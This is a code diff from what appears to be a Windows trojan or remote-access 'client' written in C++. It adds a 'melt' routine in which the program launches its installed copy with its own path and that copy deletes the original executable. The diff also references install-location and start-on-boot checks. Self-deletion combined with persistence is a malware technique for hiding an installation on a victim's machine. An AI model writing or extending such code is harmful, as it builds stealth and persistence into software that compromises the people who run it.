@@ -56,30 +56,29 @@ bool installed()		//checks if executable is installed properly (location + start
 		return false;
 }
 
-bool melt()			//deletes old file
-{
-	return true;
-}
-
 void installCheck()		//checks if this run of the program is designated to the install process, then checks whether it should start the installed client
 {
 	if (installing)
 		if (!startOnNextBoot)
 		{
-			if (meltSelf)
-			{			//ONLY AN ALTERNATIVE; CREATEPROCESS NEEDS WORK
-
-			}
-			startProcess(installPath.c_str(), NULL);		//REPLACE NULL TO, "meltSelf ? 'CURRENTPATH' : NULL"	WHEN CREATEPROCESS FIXED
+			startProcess(installPath.c_str(), meltSelf ? convStringToLPTSTR("t " + currentPath) : NULL);		//REPLACE NULL TO, "meltSelf ? 'CURRENTPATH' : NULL"	WHEN CREATEPROCESS FIXED
 		}
 
 }
 
 int init()		//startup of program
 {
+	//VARIABLE SETUP
 	currentPath = getCurrentPath();
 	installFolder = getInstallFolder();
 	installPath = getInstallPath(installFolder);
+
+
+
+	if (!(lpArguments == NULL || (lpArguments[0] == 0)) && meltSelf)
+	{
+		remove(lpArguments);
+	}
 
 	if (installSelf)
 	{
@@ -102,12 +101,19 @@ int init()		//startup of program
 	installCheck();
 
 
-	return 0;
+	return installing ? 1 : 0;
 }
 
 
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)	//main function
 {
-	//init();
+	//VARIABLE SETUP
+	lpArguments = lpCmdLine;
+
+
+	if (init() == 1)
+		return 0;
+
+
 	return 0;
 }
